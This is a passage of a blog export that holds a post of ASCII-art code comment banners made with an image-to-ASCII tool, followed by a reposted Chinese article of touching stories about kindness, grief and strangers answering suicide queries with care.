.-~~____--~-&#x2F;                  ~~&#x3D;&#x3D;.</span><br><span class="line"> *                      ((-&gt;&#x2F;~   &#39;.|||&#39; -_|    ~~-&#x2F; ,              . _||</span><br><span class="line"> *                                 -_     ~\      ~~---l__i__i__i--~~_&#x2F;</span><br><span class="line"> *                                 _-~-__   ~)  \--______________--~~</span><br><span class="line"> *                               &#x2F;&#x2F;.-~~~-~_--~- |-------~~~~~~~~</span><br><span class="line"> *                                      &#x2F;&#x2F;.-~~~--\</span><br><span class="line"> *                               神兽保佑</span><br><span class="line"> *                              代码无BUG!</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;***                              _</span><br><span class="line"> *  _._ _..._ .-&#39;,     _.._(&#96;))</span><br><span class="line"> * &#39;-. &#96;     &#39;  &#x2F;-._.-&#39;    &#39;,&#x2F;</span><br><span class="line"> *    )         \            &#39;.</span><br><span class="line"> *   &#x2F; _    _    |             \</span><br><span class="line"> *  |  a    a    &#x2F;              |</span><br><span class="line"> *  \   .-.                     ;</span><br><span class="line"> *   &#39;-(&#39;&#39; ).-&#39;       ,&#39;       ;</span><br><span class="line"> *      &#39;-;           |      .&#39;</span><br><span class="line"> *         \           \    &#x2F;</span><br><span class="line"> *         | 7  .__  _.-\   \</span><br><span class="line"> *         | |  |  &#96;&#96;&#x2F;  &#x2F;&#96;  &#x2F;</span><br><span class="line"> *        &#x2F;,_|  |   &#x2F;,_&#x2F;   &#x2F;</span><br><span class="line"> *           &#x2F;,_&#x2F;      &#39;&#96;-&#39;</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;***</span><br><span class="line"> **************************************************************</span><br><span class="line"> *                                                            *</span><br><span class="line"> *   .&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-.       *</span><br><span class="line"> *    |                     ______                     |      *</span><br><span class="line"> *    |                  .-&quot;      &quot;-.                  |      *</span><br><span class="line"> *    |                 &#x2F;            \                 |      *</span><br><span class="line"> *    |     _          |              |          _     |      *</span><br><span class="line"> *    |    ( \         |,  .-.  .-.  ,|         &#x2F; )    |      *</span><br><span class="line"> *    |     &gt; &quot;&#x3D;._     | )(__&#x2F;  \__)( |     _.&#x3D;&quot; &lt;     |      *</span><br><span class="line"> *    |    (_&#x2F;&quot;&#x3D;._&quot;&#x3D;._ |&#x2F;     &#x2F;\     \| _.&#x3D;&quot;_.&#x3D;&quot;\_)    |      *</span><br><span class="line"> *    |           &quot;&#x3D;._&quot;(_     ^^     _)&quot;_.&#x3D;&quot;           |      *</span><br><span class="line"> *    |               &quot;&#x3D;\__|IIIIII|__&#x2F;&#x3D;&quot;               |      *</span><br><span class="line"> *    |              _.&#x3D;&quot;| \IIIIII&#x2F; |&quot;&#x3D;._              |      *</span><br><span class="line"> *    |    _     _.&#x3D;&quot;_.&#x3D;&quot;\          &#x2F;&quot;&#x3D;._&quot;&#x3D;._     _    |      *</span><br><span class="line"> *    |   ( \_.&#x3D;&quot;_.&#x3D;&quot;     &#96;--------&#96;     &quot;&#x3D;._&quot;&#x3D;._&#x2F; )   |      *</span><br><span class="line"> *    |    &gt; _.&#x3D;&quot;                            &quot;&#x3D;._ &lt;    |      *</span><br><span class="line"> *    |   (_&#x2F;                                    \_)   |      *</span><br><span class="line"> *    |                                                |      *</span><br><span class="line"> *    &#39;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;&#39;      *</span><br><span class="line"> *                                                            *</span><br><span class="line"> *           LASCIATE OGNI SPERANZA, VOI CH&#39;ENTRATE           *</span><br><span class="line"> **************************************************************</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;***</span><br><span class="line"> *                                         ,s555SB@@&amp;                          </span><br><span class="line"> *                                      :9H####@@@@@Xi                        </span><br><span class="line"> *                                     1@@@@@@@@@@@@@@8                       </span><br><span class="line"> *                                   ,8@@@@@@@@@B@@@@@@8                      </span><br><span class="line"> *                                  :B@@@@X3hi8Bs;B@@@@@Ah,                   </span><br><span class="line"> *             ,8i                  r@@@B:     1S ,M@@@@@@#8;                 </span><br><span class="line"> *            1AB35.i:               X@@8 .   SGhr ,A@@@@@@@@S                </span><br><span class="line"> *            1@h31MX8                18Hhh3i .i3r ,A@@@@@@@@@5               </span><br><span class="line"> *            ;@&amp;i,58r5                 rGSS:     :B@@@@@@@@@@A               </span><br><span class="line"> *             1#i  . 9i                 hX.  .: .5@@@@@@@@@@@1               </span><br><span class="line"> *              sG1,  ,G53s.              9#Xi;hS5 3B@@@@@@@B1                </span><br><span class="line"> *               .h8h.,A@@@MXSs,           #@H1:    3ssSSX@1                  </span><br><span class="line"> *               s ,@@@@@@@@@@@@Xhi,       r#@@X1s9M8    .GA981               </span><br><span class="line"> *               ,. rS8H#@@@@@@@@@@#HG51;.  .h31i;9@r    .8@@@@BS;i;          </span><br><span class="line"> *                .19AXXXAB@@@@@@@@@@@@@@#MHXG893hrX#XGGXM@@@@@@@@@@MS        </span><br><span class="line"> *                s@@MM@@@hsX#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&amp;,      </span><br><span class="line"> *              :GB@#3G@@Brs ,1GM@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@B,     </span><br><span class="line"> *            .hM@@@#@@#MX 51  r;iSGAM@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@8     </span><br><span class="line"> *          :3B@@@@@@@@@@@&amp;9@h :Gs   .;sSXH@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:    </span><br><span class="line"> *      s&amp;HA#@@@@@@@@@@@@@@M89A;.8S.       ,r3@@@@@@@@@@@@@@@@@@@@@@@@@@@r    </span><br><span class="line"> *   ,13B@@@@@@@@@@@@@@@@@@@5 5B3 ;.         ;@@@@@@@@@@@@@@@@@@@@@@@@@@@i    </span><br><span class="line"> *  5#@@#&amp;@@@@@@@@@@@@@@@@@@9  .39:          ;@@@@@@@@@@@@@@@@@@@@@@@@@@@;    </span><br><span class="line"> *  9@@@X:MM@@@@@@@@@@@@@@@#;    ;31.         H@@@@@@@@@@@@@@@@@@@@@@@@@@:    </span><br><span class="line"> *   SH#@B9.rM@@@@@@@@@@@@@B       :.         3@@@@@@@@@@@@@@@@@@@@@@@@@@5    </span><br><span class="line"> *     ,:.   9@@@@@@@@@@@#HB5                 .M@@@@@@@@@@@@@@@@@@@@@@@@@B    </span><br><span class="line"> *           ,ssirhSM@&amp;1;i19911i,.             s@@@@@@@@@@@@@@@@@@@@@@@@@@S   </span><br><span class="line"> *              ,,,rHAri1h1rh&amp;@#353Sh:          8@@@@@@@@@@@@@@@@@@@@@@@@@#:  </span><br><span class="line"> *            .A3hH@#5S553&amp;@@#h   i:i9S          #@@@@@@@@@@@@@@@@@@@@@@@@@A.</span><br><span class="line"> *</span><br><span class="line"> *</span><br><span class="line"> *    又看源码，看你妹妹呀！</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;***</span><br><span class="line"> *             ,%%%%%%%%,</span><br><span class="line"> *           ,%%&#x2F;\%%%%&#x2F;\%%</span><br><span class="line"> *          ,%%%\c &quot;&quot; J&#x2F;%%%</span><br><span class="line"> * %.       %%%%&#x2F; o  o \%%%</span><br><span class="line"> * &#96;%%.     %%%%    _  |%%%</span><br><span class="line"> *  &#96;%%     &#96;%%%%(__Y__)%%&#39;</span><br><span class="line"> *  &#x2F;&#x2F;       ;%%%%&#96;\-&#x2F;%%%&#39;</span><br><span class="line"> * ((       &#x2F;  &#96;%%%%%%%&#39;</span><br><span class="line"> *  \\    .&#39;          |</span><br><span class="line"> *   \\  &#x2F;       \  | |</span><br><span class="line"> *    \\&#x2F;         ) | |</span><br><span class="line"> *     \         &#x2F;_ | |__</span><br><span class="line"> *     (___________))))))) 攻城湿</span><br><span class="line"> *</span><br><span class="line"> *        _       _</span><br><span class="line"> * __   _(_)_   _(_) __ _ _ __</span><br><span class="line"> * \ \ &#x2F; &#x2F; \ \ &#x2F; &#x2F; |&#x2F; _&#96; |&#39;_ \</span><br><span class="line"> *  \ V &#x2F;| |\ V &#x2F;| | (_| | | | |</span><br><span class="line"> *   \_&#x2F; |_| \_&#x2F; |_|\__,_|_| |_|</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;***</span><br><span class="line"> * </span><br><span class="line"> *  .--,       .--,</span><br><span class="line"> * ( (  \.---.&#x2F;  ) )</span><br><span class="line"> *  &#39;.__&#x2F;o   o\__.&#39;</span><br><span class="line"> *     &#123;&#x3D;  ^  &#x3D;&#125;</span><br><span class="line"> *      &gt;  -  &lt;</span><br><span class="line"> *     &#x2F;       \</span><br><span class="line"> *    &#x2F;&#x2F;       \\</span><br><span class="line"> *   &#x2F;&#x2F;|   .   |\\</span><br><span class="line"> *   &quot;&#39;\       &#x2F;&#39;&quot;_.-~^&#96;&#39;-.</span><br><span class="line"> *      \  _  &#x2F;--&#39;         &#96;</span><br><span class="line"> *    ___)( )(___</span><br><span class="line"> *   (((__) (__)))    高山仰止,景行行止.虽不能至,心向往之。</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;***</span><br><span class="line"> * 頂頂頂頂頂頂頂頂頂 頂頂頂頂頂頂頂頂頂</span><br><span class="line"> * 頂頂頂頂頂頂頂     頂頂     </span><br><span class="line"> *    頂頂   頂頂頂頂頂頂頂頂頂頂頂</span><br><span class="line"> *    頂頂   頂頂頂頂頂頂頂頂頂頂頂</span><br><span class="line"> *    頂頂   頂頂       頂頂</span><br><span class="line"> *    頂頂   頂頂  頂頂頂  頂頂</span><br><span class="line"> *    頂頂   頂頂  頂頂頂  頂頂</span><br><span class="line"> *    頂頂   頂頂  頂頂頂  頂頂</span><br><span class="line"> *    頂頂   頂頂  頂頂頂  頂頂</span><br><span class="line"> *    頂頂       頂頂頂 </span><br><span class="line"> *    頂頂      頂頂 頂頂 頂頂</span><br><span class="line"> *  頂頂頂頂   頂頂頂頂頂 頂頂頂頂頂</span><br><span class="line"> *  頂頂頂頂   頂頂頂頂   頂頂頂頂</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;***</span><br><span class="line"> *                        d*##$.</span><br><span class="line"> *  zP&quot;&quot;&quot;&quot;&quot;$e.           $&quot;    $o</span><br><span class="line"> * 4$       &#39;$          $&quot;      $</span><br><span class="line"> * &#39;$        &#39;$        J$       $F</span><br><span class="line"> *  &#39;b        $k       $&gt;       $</span><br><span class="line"> *   $k        $r     J$       d$</span><br><span class="line"> *   &#39;$         $     $&quot;       $~</span><br><span class="line"> *    &#39;$        &quot;$   &#39;$E       $</span><br><span class="line"> *     $         $L   $&quot;      $F ...</span><br><span class="line"> *      $.       4B   $      $$$*&quot;&quot;&quot;*b</span><br><span class="line"> *      &#39;$        $.  $$     $$      $F</span><br><span class="line"> *       &quot;$       R$  $F     $&quot;      $</span><br><span class="line"> *        $k      ?$ u*     dF      .$</span><br><span class="line"> *        ^$.      $$&quot;     z$      u$$$$e</span><br><span class="line"> *         #$b             $E.dW@e$&quot;    ?$</span><br><span class="line"> *          #$           .o$$# d$$$$c    ?F</span><br><span class="line"> *           $      .d$$#&quot; . zo$&gt;   #$r .uF</span><br><span class="line"> *           $L .u$*&quot;      $&amp;$$$k   .$$d$$F</span><br><span class="line"> *            $$&quot;            &quot;&quot;^&quot;$$$P&quot;$P9$</span><br><span class="line"> *           JP              .o$$$$u:$P $$</span><br><span class="line"> *           $          ..ue$&quot;      &quot;&quot;  $&quot;</span><br><span class="line"> *          d$          $F              $</span><br><span class="line"> *          $$     ....udE             4B</span><br><span class="line"> *           #$    &quot;&quot;&quot;&quot;&#96; $r            @$</span><br><span class="line"> *            ^$L        &#39;$            $F</span><br><span class="line"> *              RN        4N           $</span><br><span class="line"> *               *$b                  d$</span><br><span class="line"> *                $$k                 $F</span><br><span class="line"> *                 $$b                $F</span><br><span class="line"> *                  $&quot;&quot;               $F</span><br><span class="line"> *                  &#39;$                $</span><br><span class="line"> *                   $L               $</span><br><span class="line"> *                   &#39;$               $</span><br><span class="line"> *                    $               $</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;***</span><br><span class="line"> *              ,----------------,              ,---------,</span><br><span class="line"> *         ,-----------------------,          ,&quot;        ,&quot;|</span><br><span class="line"> *       ,&quot;                      ,&quot;|        ,&quot;        ,&quot;  |</span><br><span class="line"> *      +-----------------------+  |      ,&quot;        ,&quot;    |</span><br><span class="line"> *      |  .-----------------.  |  |     +---------+      |</span><br><span class="line"> *      |  |                 |  |  |     | -&#x3D;&#x3D;----&#39;|      |</span><br><span class="line"> *      |  |  I LOVE DOS!    |  |  |     |         |      |</span><br><span class="line"> *      |  |  Bad command or |  |  |&#x2F;----|&#96;---&#x3D;    |      |</span><br><span class="line"> *      |  |  C:\&gt;_          |  |  |   ,&#x2F;|&#x3D;&#x3D;&#x3D;&#x3D; ooo |      ;</span><br><span class="line"> *      |  |                 |  |  |  &#x2F;&#x2F; |(((( [33]|    ,&quot;</span><br><span class="line"> *      |  &#96;-----------------&#39;  |,&quot; .;&#39;| |((((     |  ,&quot;</span><br><span class="line"> *      +-----------------------+  ;;  | |         |,&quot;</span><br><span class="line"> *         &#x2F;_)______________(_&#x2F;  &#x2F;&#x2F;&#39;   | +---------+</span><br><span class="line"> *    ___________________________&#x2F;___  &#96;,</span><br><span class="line"> *   &#x2F;  oooooooooooooooo  .o.  oooo &#x2F;,   \,&quot;-----------</span><br><span class="line"> *  &#x2F; &#x3D;&#x3D;ooooooooooooooo&#x3D;&#x3D;.o.  ooo&#x3D; &#x2F;&#x2F;   ,&#96;\--&#123;)B     ,&quot;</span><br><span class="line"> * &#x2F;_&#x3D;&#x3D;__&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;__&#x3D;&#x3D;_ooo__ooo&#x3D;_&#x2F;&#39;   &#x2F;___________,&quot;</span><br><span class="line"> *</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;***</span><br><span class="line"> *                 .-~~~~~~~~~-._       _.-~~~~~~~~~-.</span><br><span class="line"> *             __.&#39;              ~.   .~              &#96;.__</span><br><span class="line"> *           .&#39;&#x2F;&#x2F;                  \.&#x2F;                  \\&#96;.</span><br><span class="line"> *         .&#39;&#x2F;&#x2F;                     |                     \\&#96;.</span><br><span class="line"> *       .&#39;&#x2F;&#x2F; .-~&quot;&quot;&quot;&quot;&quot;&quot;&quot;~~~~-._     |     _,-~~~~&quot;&quot;&quot;&quot;&quot;&quot;&quot;~-. \\&#96;.</span><br><span class="line"> *     .&#39;&#x2F;&#x2F;.-&quot;                 &#96;-.  |  .-&#39;                 &quot;-.\\&#96;.</span><br><span class="line"> *   .&#39;&#x2F;&#x2F;______.&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;-..   \ | &#x2F;   ..-&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;.______\\&#96;.</span><br><span class="line"> * .&#39;______________________________\|&#x2F;______________________________&#96;.</span><br><span class="line"> *</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure>
<p>方法主要是图片转字符,在线版的地址！<br>工具：<a href="http://www.makepic.net/Tool/Image2ascii.html">http://www.makepic.net/Tool/Image2ascii.html</a></p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title></title>
    <url>/nirvana/uncategorized/%E9%9A%8F%E7%AC%94/%E6%9C%80%E2%80%B3%E6%AE%8B%E5%BF%8D%E2%80%B3%E7%9A%84%E5%81%B7%E6%8B%8D%E7%85%A7%EF%BC%9A%E5%88%AB%E6%AD%BB%E4%BA%86%EF%BC%8C%E6%88%91%E7%88%B1%E4%BD%A0%EF%BC%81/</url>
    <content><![CDATA[<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>最″残忍″的偷拍照：别死了，我爱你！</title>
    <style type="text/css" media="all">
      body {
        margin: 0;
        font-family: "Helvetica Neue", Helvetica, Arial, "Hiragino Sans GB", sans-serif;
        font-size: 14px;
        line-height: 20px;
        color: #777;
        background-color: white;
      }
      .container {
        width: 700px;
        margin-right: auto;
        margin-left: auto;
      }

      .post {
        font-family: Georgia, "Times New Roman", Times, "SimSun", serif;
        position: relative;
        padding: 70px;
        bottom: 0;
        overflow-y: auto;
        font-size: 16px;
        font-weight: normal;
        line-height: 25px;
        color: #515151;
      }

      .post h1{
        font-size: 50px;
        font-weight: 500;
        line-height: 60px;
        margin-bottom: 40px;
        color: inherit;
      }

      .post p {
        margin: 0 0 35px 0;
      }

      .post img {
        border: 1px solid #D9D9D9;
      }

      .post a {
        color: #28A1C5;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="post">
        <h1 class="title">最″残忍″的偷拍照：别死了，我爱你！</h1>
        <div class="show-content">
          <p><i><b>转自微博<a href="https://weibo.com/ttarticle/p/show?id=2309404222517488295595" target="_blank">https://weibo.com/ttarticle/p/show?id=2309404222517488295595</a></b></i></p><p>桌子的生活观 出品</p><p><b>01.</b></p><p>在百度上面，关于自杀的结果有47,100,000个，每天都有无数人搜索自杀，可是搜索后弹出来的第一条信息是这样的：</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/10024246-c0120df83a664b0f?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p><b>这个世界虽然不完美，我们仍可以治愈自己，</b>并且提供免费咨询电话，一下子就让人的心里温暖起来。</p><p>有人在网上问怎样最轻松自杀？</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/10024246-a255c86f457ff061?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>最后一句<b>好好活着</b>，真的让人眼泪差点掉下来。</p><p>还有很多热心网友跟帖：</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/10024246-3778300b222548ef?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>还有人问手上的动脉在哪里：</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/10024246-14084e975ab904f5?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p><b>“别找了，我爱你”</b>一句话就让我泪流满面。</p><p><b>谢谢你们，这么温暖的陌生人。</b></p><p><b>你永远不会知道，一个陌生人的善意，将会对一个濒临绝望的人带来多大的生活勇气。</b></p><p><b>02.</b></p><p>过年的时候，在呼和浩特，一个残疾的行乞者从新华大街乘坐29路公交车到呼铁局下车，一路上难免遭到个别乘客的嫌弃和冷言冷语。</p><p>骗子一般不会在过年的时候出来乞讨，还有他的穿着打扮，司机师傅一眼就知道他不是骗子。</p><p>就在他下车的那一瞬间，司机师傅掏出100元给他，祝他新年快乐。</p><p>一边是个别乘客的白眼，一边是司机师傅的暖心举动，行乞者满眼都是眼泪，就在路边呜呜地哭起来……</p><p>如果不是被生活逼得不行，谁会在过年的时候出来乞讨啊？</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/10024246-1f7847f08c7fa0fc?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
</div><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/10024246-bb98b79825b4981d?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p><b>生而为人，请善待每一个人。</b></p><p><b>03.</b></p><p>在郑州金水路英协路口，一环卫阿姨将自己带的鸡蛋早餐让给了盲人乞讨者，并将鸡蛋剥皮放入盲人口中，盲人激动的跪地感谢。</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/10024246-4dda2e23cb0c0e6f?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
</div><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/10024246-d156ae5e8358fa1c?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>或许，只有生活艰难的人，更能体会到生存艰难人的不易。</p><p><b>下跪有时候并不代表奴性，只是身无长物的时候，这是表达感激的最高形式。</b></p><p><b>即使是一道最微弱的光，我们也要把它洒向最需要温暖的地方。</b></p><p><b>04</b>.</p><p>一位60多岁的老太太接到了一个诈骗电话，对方谎称是他儿子，但他儿子在两年前已经死了。</p><p>可那骗子的声音和她儿子实在太像，她舍不得挂断。骗子说得口干舌燥，发现骗不了她，她便把真相都说了，最后老太太请求对方"最后再说一句吧。"</p><p>骗子思考片刻说：<b>"妈，保重啊。"</b>挂了电话。</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/10024246-0339ebf2cbeb85d5?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>读到这里，我鼻子一酸，眼泪哗哗直流。</p><p>“妈，保重啊，”，我相信那个骗子一定也对自己的母亲说过很多次，他良心未泯，希望他能迷途知返，不要让爱自己的人失望。</p><p><b>05.</b></p><p>韩国岁月号沉没了，这五个最要好的朋友也随着船的沉没，与自己的家人天人永隔。</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/10024246-1bf165236c28f2ee?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>后来，他们的儿子也成了最好的朋友，他们回到当年父亲拍照的地方，每个人坐到自己父亲当年的位置，摆出一样的姿势。</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/10024246-f964a88ccdb4ba3f?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p><b>这样的照片看得很心酸，但是生命就是如此神奇，上一辈的友谊在那一次事故中结束了，还是可以在下一辈的身上得以延续。</b></p><p><b>06.</b></p><p>如果能回到过去，你会对过去的自己说什么？</p><p>日本一位76岁叫秀夫的老爷爷，很想对年轻时候的自己说一件事情。</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/10024246-af34a9d637b87032?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p><b>白云苍狗，世事无常，在这个薄情的世界上，原来还有人如此深情地活着。</b></p><p>明天和意外不知道哪个会先来临，所以啊，一定要趁现在，好好珍惜身边的爱人。</p><p><b>07.</b></p><p>63岁的老何是抚顺人，他和老伴来到沈阳打工。他们的日子虽然不太富有，但是两人在相濡以沫的日子里非常满足。</p><p>有一天，他的老伴去药房买药，可是在回来的路上突发心肌梗塞倒地猝死。</p><p>老何赶到后，紧紧地抱着自己的老伴，嘴里不停嘟囔着：“今天不让你出来，你非得出来，怎么今天就走了呢？”</p><p>那个时候的沈阳是零下24度，老何抱着老伴的尸体再冰天雪地里坐了两个小时仍然不肯撒手。</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/10024246-1f622e2a957b9965?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
</div><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/10024246-bcd646338882f950?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>群众们怕他冻坏了，找来纸壳、塑料泡沫，让老爷子垫在身下别着凉，老何一边谢谢一边说：“我不冷，我没事，我还不想起来，我想最后再抱她一会儿，以后都没有机会了。”</p><p>于是，十几名群众主动围成一圈给这对夫妻遮风，希望他们“团圆”的时间能再长一点，在场的所有人都为之动容。</p><p>“太感动了，此生做夫妻能这般，是任何金钱和荣华富贵都换不来的。”</p><p><b>人们常说，少年夫妻老来伴，其实这句话最朴实，也最深情。</b></p><p><b>年少时陪伴在我身边的那个人啊，虽然历经岁月的风霜，但你离去的时候，我仍然舍不得放手。</b></p><p><b>08.</b></p><p>孩子和爸爸、妈妈、奶奶在路边等车，这个时候的他是开心的，因为只要和爸爸妈妈在一起就很开心啊。</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/10024246-e25d6a5348d4a635?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
</div><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/10024246-47858c4f6b3086eb?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
</div><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/10024246-b320e7d46a17bac7?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>可是接下来他才知道，爸爸妈妈又要离开自己了。</p><p>他嚎啕大哭，想要追上汽车，可是却被奶奶扯住了。</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/10024246-e9340467ffd18887?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
</div><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/10024246-a1324ab57b67ab40?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
</div><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/10024246-d5bc2cde9df16f83?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>最后奶奶抱着他，孤独地走回家，那是一个冰冷的家，没有爸爸和妈妈的家。</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/10024246-9ffc66f3d631423e?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>或许我们很多人从小就要和父母面对这样的离别，希望这样的别离不要发生在我们的下一代身上。</p><p>曾经有人问我，为什么要努力赚钱？这就是最好的理由，为了能够和自己的孩子生活在一起！</p><p><b>希望每个孩子都能拥有美好的童年，都有父母陪在身边。</b></p><p><b>09.</b></p><p>一个孩子的父亲在工地上干活，每天挥汗如雨，非常累。</p><p>孩子担心他太累，又担心他的安危，于是在父亲的安全帽上画了一顶皇冠。</p><p><b>也许在别人眼中他是做着又脏又累的活儿，但在孩子眼中，他就是国王。</b></p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/10024246-4a2a77949a017a5d?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>这是一个孩子对父亲稚嫩的爱，如此温暖，又如此心酸。</p><p>我猜这位父亲的孩子一定是一位小公主吧，你还记得自己为父亲做过什么吗？</p><p><b>10.</b></p><p>这是经济大萧条时期，一位父亲在背上背着牌子在街头找工作。</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/10024246-7478c93dff50fab8?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
